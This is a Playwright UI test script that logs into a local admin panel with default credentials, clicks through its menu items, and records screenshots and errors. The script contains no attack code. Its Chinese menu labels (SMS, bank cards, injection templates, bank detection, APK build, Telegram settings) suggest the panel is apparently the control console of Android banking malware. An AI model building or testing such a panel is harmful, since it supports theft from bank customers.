import { chromium } from 'playwright';
import fs from 'node:fs';

const BASE = 'http://127.0.0.1:8080';
const OUT = 'C:\\Users\\Administrator\\Desktop\\stST\\local\\shots\\1to1';

const MENU = ['控制台', '设备', '短信', '通知', '银行卡', '注入数据', '分组管理', '黑名单', '应用设置', '注入模板', 'AI制作模板', '短信通知规则', '银行检测配置', 'APK构建', '用户设置', '安全中心', '服务器状态', 'TURN节点', 'Telegram设置'];

const browser = await chromium.launch({ channel: 'chrome', headless: true });
const ctx = await browser.newContext({ viewport: { width: 1600, height: 1000 } });
const pg = await ctx.newPage();

let cur = { console: [], pageerror: [], bad: [] };
pg.on('console', m => { if (m.type() === 'error') cur.console.push(m.text().slice(0, 200)); });
pg.on('pageerror', e => cur.pageerror.push(String(e).slice(0, 200)));
pg.on('response', r => {
  const u = r.url();
  if ((u.indexOf('/m/') >= 0 || u.indexOf('/api/') >= 0) && r.status() >= 400) cur.bad.push(r.status() + ' ' + u.replace(BASE, '').slice(0, 110));
});

async function contentHead() {
  return await pg.evaluate(() => {
    const m = document.querySelector('main') || document.body;
    let t = (m.innerText || '').replace(/\s+/g, ' ');
    t = t.replace(/^Toggle Sidebar\s*/, '');
    return t.slice(0, 130);
  }).catch(() => 'EVAL_FAIL');
}
async function shot(n) { try { await pg.screenshot({ path: OUT + '\\' + n + '.png' }); } catch (e) {} }

// login
await pg.goto(BASE + '/#/login', { waitUntil: 'domcontentloaded' });
await pg.waitForTimeout(1800);
const ins = pg.locator('input:not([type=checkbox])');
await ins.nth(0).fill('admin');
await ins.nth(1).fill('admin123');
await pg.locator('button[type=submit]').first().click();
await pg.waitForTimeout(2500);
await pg.goto(BASE + '/#/', { waitUntil: 'domcontentloaded' });
await pg.reload({ waitUntil: 'domcontentloaded' });
await pg.waitForTimeout(3000);

const results = [];
for (const label of MENU) {
  cur = { console: [], pageerror: [], bad: [] };
  let clicked = false;
  const btn = pg.locator('button', { hasText: new RegExp('^' + label + '$') }).first();
  try {
    if (await btn.count() > 0) { await btn.click({ timeout: 5000 }); clicked = true; }
  } catch (e) { cur.pageerror.push('CLICK: ' + String(e).slice(0, 120)); }
  await pg.waitForTimeout(2800);
  const head = await contentHead();
  await shot('menu_' + label);
  results.push({ label, clicked, head, console: cur.console.slice(), pageerror: cur.pageerror.slice(), bad: cur.bad.slice() });
  console.log((cur.bad.length + cur.pageerror.length === 0 ? 'OK  ' : 'FAIL') + ' ' + label + ' clicked=' + clicked + ' bad=' + cur.bad.length + ' err=' + cur.pageerror.length + ' | ' + head.slice(0, 60));
}

fs.writeFileSync('C:\\Users\\Administrator\\Desktop\\stST\\local\\_ui_menu.json', JSON.stringify(results, null, 1), 'utf8');
console.log('console errors total=' + results.reduce((a, e) => a + e.console.length, 0));
await browser.close();
